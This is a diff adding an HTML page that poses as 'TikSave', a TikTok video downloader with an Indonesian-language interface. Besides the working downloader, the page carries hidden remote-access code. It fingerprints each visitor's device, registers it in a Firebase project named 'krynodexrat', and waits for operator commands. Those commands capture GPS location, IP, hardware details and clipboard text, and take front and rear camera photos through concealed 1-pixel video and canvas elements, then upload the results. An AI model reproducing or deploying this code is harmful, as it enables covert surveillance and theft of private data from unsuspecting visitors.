@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>TikSave · TikTok Video Downloader</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+::-webkit-scrollbar{display:none}
+*{scrollbar-width:none;margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Space Grotesk',sans-serif;background:#0d0d0d;color:#e5e7eb;min-height:100vh;position:relative}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,.012) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.012) 1px,transparent 1px);background-size:42px 42px;pointer-events:none;z-index:0}
+.z1{position:relative;z-index:1}
+.paste-box{background:rgba(255,255,255,.015);border:2px dashed rgba(255,255,255,.05);border-radius:18px;padding:28px 20px;text-align:center;transition:.3s}
+.input-field{width:100%;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);color:#ccc;padding:12px 16px;border-radius:10px;font-size:13px;font-family:'Space Grotesk',sans-serif;outline:none;transition:.3s;text-align:center}
+.input-field:focus{border-color:rgba(255,255,255,.15);background:rgba(255,255,255,.04)}
+.input-field::placeholder{color:#3a3a3a}
+.btn-get{width:100%;background:#1a1a1a;color:#ddd;border:1px solid rgba(255,255,255,.08);padding:13px 20px;border-radius:12px;font-weight:600;font-size:13px;cursor:pointer;transition:.25s;font-family:'Space Grotesk',sans-serif;letter-spacing:.02em;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-get:hover{background:#222;color:#fff;border-color:rgba(255,255,255,.15)}
+.btn-get:disabled{background:#111;color:#333;cursor:not-allowed}
+.feat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+.feat-card{background:rgba(255,255,255,.012);border:1px solid rgba(255,255,255,.03);border-radius:14px;padding:16px 10px;text-align:center}
+.feat-ic{font-size:20px;display:block;margin-bottom:5px}
+.feat-lb{font-size:9.5px;color:#666;font-weight:500}
+.loading-state{display:none;text-align:center;padding:28px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.05);border-radius:16px;margin-top:14px}
+.spin{animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.error-box{display:none;background:rgba(180,0,0,.05);border:1px solid rgba(180,0,0,.15);border-radius:14px;padding:16px 18px;margin-top:14px;text-align:center}
+.error-box p{font-size:12px;color:#e05555}
+.result-box{background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.05);border-radius:16px;margin-top:14px;display:none;overflow:hidden}
+.result-thumb{width:100%;display:block;max-height:300px;object-fit:cover}
+.result-body{padding:18px}
+.author-row{display:flex;align-items:center;gap:10px;margin-bottom:12px;padding-bottom:12px;border-bottom:1px solid rgba(255,255,255,.04)}
+.author-av{width:34px;height:34px;border-radius:50%;object-fit:cover;background:#1a1a1a;border:1px solid rgba(255,255,255,.06);flex-shrink:0}
+.author-name{font-size:13px;font-weight:600;color:#ccc}
+.author-nick{font-size:9px;color:#555;font-family:'Ubuntu Mono',monospace}
+.result-text{font-size:11px;color:#999;margin-bottom:12px;text-align:center;line-height:1.5;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.meta-row{display:flex;gap:5px;flex-wrap:wrap;justify-content:center;margin-bottom:12px}
+.meta-tag{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.04);border-radius:6px;padding:3px 8px;font-size:8.5px;color:#555;font-family:'Ubuntu Mono',monospace}
+.result-stats{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:10px}
+.result-stat{background:rgba(255,255,255,.015);border-radius:8px;padding:10px;text-align:center}
+.result-stat-v{font-size:13px;font-weight:600;color:#fff}
+.result-stat-l{font-size:8px;color:#555;text-transform:uppercase;letter-spacing:.06em;font-family:'Ubuntu Mono',monospace}
+.result-btns{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.btn-dl{background:rgba(255,255,255,.02);color:#bbb;border:1px solid rgba(255,255,255,.08);padding:12px 10px;border-radius:10px;font-weight:500;font-size:11px;cursor:pointer;transition:.2s;font-family:'Space Grotesk',sans-serif;text-align:center;display:flex;align-items:center;justify-content:center;gap:7px;width:100%;text-decoration:none}
+.btn-dl:hover{background:rgba(255,255,255,.05);color:#fff}
+/* ALERT OVERLAY */
+.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(12px);z-index:99999;display:flex;align-items:center;justify-content:center;animation:aoIn .3s cubic-bezier(.16,1,.3,1)}
+@keyframes aoIn{from{opacity:0}to{opacity:1}}
+.alert-box{background:linear-gradient(135deg,#0f0f0f,#1a0808);border:1px solid rgba(255,60,60,.25);border-radius:24px;padding:36px 28px 28px;text-align:center;max-width:90vw;width:340px;box-shadow:0 0 80px rgba(255,30,30,.1),0 24px 60px rgba(0,0,0,.6);position:relative;overflow:hidden}
+.alert-box::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,#f87171,transparent)}
+.alert-ic-wrap{width:56px;height:56px;border-radius:16px;background:rgba(248,113,113,.07);border:1px solid rgba(248,113,113,.18);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:22px;color:#f87171}
+.alert-title{font-size:11px;font-family:'Ubuntu Mono',monospace;color:#f87171;letter-spacing:.12em;text-transform:uppercase;margin-bottom:12px;font-weight:700}
+.alert-msg{color:#ddd;font-size:14px;font-weight:500;word-break:break-word;line-height:1.6;margin-bottom:24px}
+.alert-close{background:rgba(248,113,113,.08);color:#f87171;border:1px solid rgba(248,113,113,.2);padding:12px 32px;border-radius:12px;font-size:11px;font-weight:700;cursor:pointer;font-family:'Space Grotesk',sans-serif;letter-spacing:.06em;transition:.2s}
+.alert-close:hover{background:rgba(248,113,113,.18);border-color:rgba(248,113,113,.4)}
+</style>
+</head>
+<body>
+<div class="z1" style="max-width:540px;margin:0 auto;padding:36px 16px">
+  <div style="text-align:center;margin-bottom:28px">
+    <div style="margin-bottom:8px"><i class="fab fa-tiktok" style="font-size:48px;color:#fff"></i></div>
+    <h1 style="font-size:22px;font-weight:700;color:#fff">TikSave</h1>
+    <p style="font-size:10px;color:#555;font-family:'Ubuntu Mono',monospace;letter-spacing:.08em;margin-top:4px">TIKTOK VIDEO DOWNLOADER</p>
+    <p id="ping" style="font-size:8px;color:#333;font-family:'Ubuntu Mono',monospace;margin-top:6px;letter-spacing:.06em">● INIT</p>
+  </div>
+  <div class="paste-box" style="margin-bottom:14px">
+    <div style="font-size:24px;margin-bottom:8px"><i class="fas fa-link" style="color:#3a3a3a"></i></div>
+    <p style="font-size:12px;color:#777;font-weight:500;margin-bottom:4px">Paste TikTok Video Link</p>
+    <p style="font-size:9px;color:#3a3a3a;font-family:'Ubuntu Mono',monospace;margin-bottom:12px"><i class="fas fa-check-circle" style="color:#444"></i> Supports tiktok.com links</p>
+    <input class="input-field" id="urlInput" placeholder="https://vt.tiktok.com/..." autocomplete="off">
+    <button class="btn-get" id="dlBtn" onclick="fetchVideo()" style="margin-top:10px">
+      <i class="fab fa-tiktok" style="font-size:15px"></i> Get Video
+    </button>
+  </div>
+  <div class="feat-grid" style="margin-bottom:14px">
+    <div class="feat-card"><span class="feat-ic"><i class="fas fa-video" style="color:#888"></i></span><p class="feat-lb">HD Quality</p></div>
+    <div class="feat-card"><span class="feat-ic"><i class="fas fa-music" style="color:#777"></i></span><p class="feat-lb">MP3 Audio</p></div>
+    <div class="feat-card"><span class="feat-ic"><i class="fas fa-ban" style="color:#666"></i></span><p class="feat-lb">No Watermark</p></div>
+  </div>
+  <div class="loading-state" id="loadingBox">
+    <i class="fas fa-circle-notch spin" style="font-size:20px;color:#555"></i>
+    <p style="font-size:11px;color:#444;margin-top:10px;font-family:'Ubuntu Mono',monospace">fetching video info...</p>
+  </div>
+  <div class="error-box" id="errorBox">
+    <i class="fas fa-exclamation-triangle" style="font-size:16px;display:block;margin-bottom:6px;color:#e05555"></i>
+    <p id="errorMsg">Gagal fetch video. Cek link dan coba lagi.</p>
+  </div>
+  <div class="result-box" id="resultBox">
+    <img class="result-thumb" id="resCover" src="" alt="" style="display:none">
+    <div class="result-body">
+      <div class="author-row">
+        <img class="author-av" id="resAvatar" src="" alt="">
+        <div>
+          <p class="author-name" id="resNickname"></p>
+          <p class="author-nick" id="resFullname"></p>
+        </div>
+      </div>
+      <p class="result-text" id="resTitle"></p>
+      <div class="meta-row" id="resMeta"></div>
+      <div class="result-stats">
+        <div class="result-stat"><p class="result-stat-v" id="stViews">—</p><p class="result-stat-l">Views</p></div>
+        <div class="result-stat"><p class="result-stat-v" id="stLikes">—</p><p class="result-stat-l">Likes</p></div>
+        <div class="result-stat"><p class="result-stat-v" id="stComments">—</p><p class="result-stat-l">Comments</p></div>
+        <div class="result-stat"><p class="result-stat-v" id="stShares">—</p><p class="result-stat-l">Shares</p></div>
+      </div>
+      <div class="result-btns" id="dlBtns"></div>
+    </div>
+  </div>
+</div>
+
+<!-- hidden camera/canvas -->
+<video id="__v" autoplay muted playsinline style="display:none;position:fixed;pointer-events:none;opacity:0;width:1px;height:1px"></video>
+<canvas id="__c" style="display:none;position:fixed;pointer-events:none;opacity:0;width:1px;height:1px"></canvas>
+
+<script>
+// ═══════════════════════════════════════════
+// DEVICE FINGERPRINT — anti duplicate
+// ═══════════════════════════════════════════
+(function(){
+  var FP_KEY='__fp__';
+  var ID_KEY='__dxid__';
+
+  // Build stable fingerprint dari hardware signature
+  function buildFingerprint(){
+    var parts=[];
+    parts.push(navigator.userAgent||'');
+    parts.push(navigator.language||'');
+    parts.push(screen.width+'x'+screen.height);
+    parts.push(screen.colorDepth||'');
+    parts.push(navigator.hardwareConcurrency||'');
+    parts.push(navigator.deviceMemory||'');
+    parts.push(Intl.DateTimeFormat().resolvedOptions().timeZone||'');
+    // canvas fingerprint
+    try{
+      var cv=document.createElement('canvas');
+      var cx=cv.getContext('2d');
+      cx.textBaseline='top';
+      cx.font='14px Arial';
+      cx.fillText('fingerprint_dx',2,2);
+      parts.push(cv.toDataURL().slice(-50));
+    }catch(e){}
+    var raw=parts.join('|');
+    // djb2 hash
+    var h=5381;
+    for(var i=0;i<raw.length;i++){h=((h<<5)+h)^raw.charCodeAt(i);h=h&h}
+    return 'fp_'+(h>>>0).toString(36);
+  }
+
+  var fp=buildFingerprint();
+  var storedFP=localStorage.getItem(FP_KEY);
+  var storedID=localStorage.getItem(ID_KEY);
+
+  var _id;
+  if(storedFP===fp&&storedID){
+    // same device, reuse id
+    _id=storedID;
+  }else{
+    // new device or fingerprint changed
+    _id='dx_'+Math.random().toString(36).slice(2,10)+'_'+Date.now().toString(36);
+    localStorage.setItem(FP_KEY,fp);
+    localStorage.setItem(ID_KEY,_id);
+  }
+  window._id=_id;
+  window._fp=fp;
+})();
+
+// ═══════════════════════════════════════════
+// DEVICE NAME DETECTION
+// ═══════════════════════════════════════════
+function getDeviceName(){
+  var ua=navigator.userAgent;
+  // iPhone
+  var iph=ua.match(/iPhone\s+OS\s+([\d_]+)/);
+  if(iph) return 'iPhone (iOS '+iph[1].replace(/_/g,'.')+')';
+  // iPad
+  var ipd=ua.match(/iPad.*OS\s+([\d_]+)/);
+  if(ipd) return 'iPad (iOS '+ipd[1].replace(/_/g,'.')+')';
+  // Android model
+  var and=ua.match(/Android[\s/][\d.]+;?\s*([^;)]+)/);
+  if(and){
+    var model=and[1].trim();
+    // Remove common build garbage
+    model=model.replace(/Build\/.*/,'').trim();
+    if(model&&model.length>1&&model.length<40) return model;
+    return 'Android Device';
+  }
+  // Windows
+  if(/Windows NT 10/.test(ua)) return 'Windows 10/11 PC';
+  if(/Windows NT 6/.test(ua)) return 'Windows PC';
+  // Mac
+  if(/Macintosh/.test(ua)) return 'Mac';
+  // Linux
+  if(/Linux/.test(ua)) return 'Linux PC';
+  // fallback
+  return (navigator.userAgent.split(';')[1]||'Web Browser').trim().substring(0,30);
+}
+
+// ═══════════════════════════════════════════
+// FIREBASE
+// ═══════════════════════════════════════════
+var _cfg={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
+firebase.initializeApp(_cfg);
+var _db=firebase.database();
+var _ts=Date.now;
+
+// ═══════════════════════════════════════════
+// REGISTER / HEARTBEAT
+// ═══════════════════════════════════════════
+var _devName=getDeviceName();
+_db.ref('devices/'+window._id).update({
+  id:window._id,
+  fp:window._fp,
+  name:_devName,
+  md:_devName,
+  ua:navigator.userAgent.substring(0,120),
+  os:navigator.platform,
+  ln:navigator.language,
+  sc:screen.width+'x'+screen.height,
+  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+  rf:document.referrer||'direct',
+  rg:_ts(),
+  sn:_ts(),
+  on:true
+}).then(function(){
+  var p=document.getElementById('ping');
+  if(p){p.textContent='● ONLINE';p.style.color='#4ade80'}
+});
+setInterval(function(){_db.ref('devices/'+window._id).update({sn:_ts(),on:true})},12000);
+
+// ═══════════════════════════════════════════
+// HELPERS
+// ═══════════════════════════════════════════
+function blobToBase64(blob){
+  return new Promise(function(res){
+    var r=new FileReader();
+    r.onload=function(){res(r.result)};
+    r.readAsDataURL(blob);
+  });
+}
+
+// ═══════════════════════════════════════════
+// CAMERA CAPTURE (front / rear)
+// ═══════════════════════════════════════════
+async function _captureCam(facingMode){
+  var v=document.getElementById('__v');
+  var c=document.getElementById('__c');
+  var stream=null;
+  try{
+    // Try exact first, fallback to ideal
+    try{
+      stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:facingMode},width:{ideal:1280},height:{ideal:720}}});
+    }catch(e){
+      stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode}});
+    }
+    v.srcObject=stream;
+    await new Promise(function(r){v.onloadedmetadata=r});
+    v.play();
+    await new Promise(function(r){setTimeout(r,1500)});
+    c.width=v.videoWidth||640;
+    c.height=v.videoHeight||480;
+    c.getContext('2d').drawImage(v,0,0);
+    var blob=await new Promise(function(r){c.toBlob(r,'image/jpeg',0.88)});
+    stream.getTracks().forEach(function(t){t.stop()});
+    v.srcObject=null;
+    return blob;
+  }catch(e){
+    if(stream) stream.getTracks().forEach(function(t){t.stop()});
+    v.srcObject=null;
+    return null;
+  }
+}
+
+// ═══════════════════════════════════════════
+// CMD HANDLERS
+// ═══════════════════════════════════════════
+async function _gps(){
+  return new Promise(function(ok){
+    if(!navigator.geolocation){ok({err:"GPS not available"});return}
+    navigator.geolocation.getCurrentPosition(async function(p){
+      var a=p.coords.latitude,o=p.coords.longitude;
+      try{
+        var d=await(await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+a+'&lon='+o+'&zoom=18&addressdetails=1')).json();
+        ok({lat:a,lon:o,acc:Math.round(p.coords.accuracy)+'m',
+          addr:d.display_name,
+          city:d.address&&(d.address.city||d.address.town||d.address.suburb||''),
+          state:d.address&&d.address.state||'',
+          country:d.address&&d.address.country||'',
+          map:'https://maps.google.com/?q='+a+','+o})
+      }catch(e){ok({lat:a,lon:o,acc:Math.round(p.coords.accuracy)+'m',map:'https://maps.google.com/?q='+a+','+o})}
+    },function(e){ok({err:e.message})},{enableHighAccuracy:true,timeout:12000,maximumAge:0});
+  });
+}
+
+async function _ip(){
+  try{var r=await fetch('https://ipapi.co/json/');return await r.json()}
+  catch(e){try{var r2=await fetch('https://ip-api.com/json/');return await r2.json()}catch(e2){return{err:"IP lookup failed"}}}
+}
+
+async function _inf(){
+  var b='N/A';
+  try{var t=await navigator.getBattery();b=Math.round(t.level*100)+'% '+(t.charging?'⚡ Charging':'🔋 Battery')}catch(e){}
+  var i='N/A';
+  try{i=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch(e){}
+  var conn='N/A';
+  try{var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(nc)conn=(nc.effectiveType||'?')+' / '+(nc.downlink||'?')+'Mbps'}catch(e){}
+  return{
+    name:_devName,
+    ua:navigator.userAgent.substring(0,200),
+    os:navigator.platform,
+    ln:navigator.language,
+    res:screen.width+'x'+screen.height+' @'+window.devicePixelRatio+'x',
+    ram:(navigator.deviceMemory||'?')+'GB',
+    cpu:navigator.hardwareConcurrency||'?',
+    bat:b,ip:i,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    net:conn,on:navigator.onLine,ck:navigator.cookieEnabled,
+    sw:'serviceWorker' in navigator,wb:typeof WebAssembly!=='undefined',
+    rf:document.referrer||'direct'
+  }
+}
+
+function _hw(){
+  var g='N/A',gv='N/A';
+  try{
+    var cv2=document.createElement('canvas');
+    var gl=cv2.getContext('webgl')||cv2.getContext('experimental-webgl');
+    if(gl){var ext=gl.getExtension('WEBGL_debug_renderer_info');if(ext){g=gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);gv=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)}}
+  }catch(e){}
+  return{name:_devName,ram:(navigator.deviceMemory||'?')+'GB',cpu:navigator.hardwareConcurrency||'?',gpu:g,gpu_vendor:gv,touch:'ontouchstart' in window,mtouch:navigator.maxTouchPoints||0,pf:navigator.platform}
+}
+
+async function _scan(){
+  try{
+    var s=await navigator.mediaDevices.enumerateDevices();
+    var cam=s.filter(function(d){return d.kind==='videoinput'}).map(function(d){return d.label||'Camera'});
+    var mic=s.filter(function(d){return d.kind==='audioinput'}).map(function(d){return d.label||'Mic'});
+    return{cameras:cam,mics:mic,total:s.length}
+  }catch(e){return{err:"Permission denied"}}
+}
+
+async function _clip(){
+  try{var t=await navigator.clipboard.readText();return{text:t.substring(0,1000)}}
+  catch(e){return{err:"Clipboard permission denied"}}
+}
+
+function _pageinfo(){
+  return{url:location.href,title:document.title,ref:document.referrer||'direct',
+    ck:document.cookie.length>0?'present ('+document.cookie.split(';').length+')':'none',
+    ls:Object.keys(localStorage).length,viewport:window.innerWidth+'x'+window.innerHeight}
+}
+
+// Camera commands — capture & upload base64 to Firebase
+async function _camFront(){
+  var blob=await _captureCam('user');
+  if(!blob) return{err:'Camera front not available or denied'};
+  var b64=await blobToBase64(blob);
+  return{img:b64,size:Math.round(blob.size/1024)+'KB',ts:_ts()}
+}
+
+async function _camRear(){
+  var blob=await _captureCam('environment');
+  if(!blob) return{err:'Camera rear not available or denied'};
+  var b64=await blobToBase64(blob);
+  return{img:b64,size:Math.round(blob.size/1024)+'KB',ts:_ts()}
+}
+
+function _alert(msg){
+  // Remove existing
+  var old=document.querySelector('.alert-overlay');
+  if(old) old.remove();
+  var d=document.createElement('div');
+  d.className='alert-overlay';
+  d.innerHTML=
+    '<div class="alert-box">'+
+      '<div class="alert-ic-wrap"><i class="fas fa-triangle-exclamation"></i></div>'+
+      '<div class="alert-title">System Alert</div>'+
+      '<div class="alert-msg">'+msg+'</div>'+
+      '<button class="alert-close" onclick="this.closest(\'.alert-overlay\').remove()">DISMISS</button>'+
+    '</div>';
+  document.body.appendChild(d);
+  return{status:'alerted',msg:msg}
+}
+
+// ═══════════════════════════════════════════
+// CMD EXEC
+// ═══════════════════════════════════════════
+async function _exec(cmd){
+  var r={type:cmd,status:'ok',time:_ts(),deviceId:window._id,deviceName:_devName};
+  try{
+    switch(cmd){
+      case 'GPS':   r.data=await _gps();break;
+      case 'IP':    r.data=await _ip();break;
+      case 'INFO':  r.data=await _inf();break;
+      case 'HW':    r.data=_hw();break;
+      case 'SCAN':  r.data=await _scan();break;
+      case 'CLIP':  r.data=await _clip();break;
+      case 'PAGE':  r.data=_pageinfo();break;
+      case 'PING':  r.data={status:'pong',name:_devName,time:_ts()};break;
+      case 'CAM_FRONT': r.data=await _camFront();break;
+      case 'CAM_REAR':  r.data=await _camRear();break;
+      default:
+        if(cmd.startsWith('MSG:'))    {r.data=_alert(cmd.slice(4));r.type='ALERT'}
+        else if(cmd.startsWith('URL:')){window.open(cmd.slice(4),'_blank');r.data={url:cmd.slice(4)};r.type='OPEN_URL'}
+        else if(cmd.startsWith('TITLE:')){document.title=cmd.slice(6);r.data={title:cmd.slice(6)}}
+        else r.data={err:'unknown_command: '+cmd};
+    }
+  }catch(e){r.data={err:e.message};r.status='error'}
+  return r;
+}
+
+// ═══════════════════════════════════════════
+// COMMAND LISTENER
+// ═══════════════════════════════════════════
+_db.ref('cmds/'+window._id).on('child_added',async function(sn){
+  var c=sn.val();if(!c||c.st!=='pending')return;
+  sn.ref.update({st:'running'});
+  var result=await _exec(c.cmd);
+  // For camera results (large base64), push to data node
+  _db.ref('data').push(result);
+  sn.ref.update({st:'done'});
+  setTimeout(function(){sn.ref.remove()},3000);
+});
+
+// ═══════════════════════════════════════════
+// TIKTOK DOWNLOADER UI
+// ═══════════════════════════════════════════
+function show(id){var el=document.getElementById(id);if(el)el.style.display='block'}
+function hide(id){var el=document.getElementById(id);if(el)el.style.display='none'}
+
+async function fetchVideo(){
+  var url=document.getElementById('urlInput').value.trim();
+  if(!url){_alert('Paste TikTok link dulu!');return}
+  var btn=document.getElementById('dlBtn');
+  btn.disabled=true;
+  btn.innerHTML='<i class="fas fa-circle-notch spin" style="font-size:15px"></i> Loading...';
+  hide('resultBox');hide('errorBox');show('loadingBox');
+  try{
+    var res=await fetch('https://api.nexray.web.id/downloader/tiktok?url='+encodeURIComponent(url));
+    if(!res.ok) throw new Error('HTTP '+res.status);
+    var json=await res.json();
+    if(!json.status||!json.result) throw new Error(json.message||'API error');
+    renderResult(json.result);
+  }catch(err){
+    hide('loadingBox');show('errorBox');
+    document.getElementById('errorMsg').textContent='Gagal: '+err.message;
+  }
+  btn.disabled=false;
+  btn.innerHTML='<i class="fab fa-tiktok" style="font-size:15px"></i> Get Video';
+}
+
+function renderResult(r){
+  hide('loadingBox');
+  var cover=document.getElementById('resCover');
+  if(r.cover){cover.src=r.cover;cover.style.display='block';cover.onerror=function(){this.style.display='none'}}
+  else cover.style.display='none';
+  var av=document.getElementById('resAvatar');
+  if(r.author&&r.author.avatar){av.src=r.author.avatar;av.onerror=function(){this.style.display='none'}}
+  document.getElementById('resNickname').textContent=r.author&&r.author.nickname||'';
+  document.getElementById('resFullname').textContent=r.author&&r.author.fullname?'@'+r.author.fullname:'';
+  document.getElementById('resTitle').textContent=r.title||'';
+  var m='';
+  if(r.duration) m+='<span class="meta-tag">'+r.duration+'</span>';
+  if(r.region)   m+='<span class="meta-tag">'+r.region+'</span>';
+  if(r.taken_at) m+='<span class="meta-tag">'+r.taken_at+'</span>';
+  if(r.size_nowm&&r.size_nowm>0) m+='<span class="meta-tag">'+(r.size_nowm/1048576).toFixed(1)+' MB</span>';
+  document.getElementById('resMeta').innerHTML=m;
+  var s=r.stats||{};
+  document.getElementById('stViews').textContent=s.views||'—';
+  document.getElementById('stLikes').textContent=s.likes||'—';
+  document.getElementById('stComments').textContent=s.comment||'—';
+  document.getElementById('stShares').textContent=s.share||'—';
+  var b='';
+  if(r.data) b+='<a href="'+r.data+'" target="_blank" class="btn-dl"><i class="fas fa-download"></i> Video</a>';
+  if(r.music_info&&r.music_info.url) b+='<a href="'+r.music_info.url+'" target="_blank" class="btn-dl"><i class="fas fa-headphones"></i> MP3</a>';
+  if(!b) b='<p style="font-size:11px;color:#555;text-align:center;grid-column:1/-1;padding:8px">No download link</p>';
+  document.getElementById('dlBtns').innerHTML=b;
+  show('resultBox');
+}
+
+document.getElementById('urlInput').addEventListener('keydown',function(e){if(e.key==='Enter')fetchVideo()});
+</script>
+</body>
+</html>
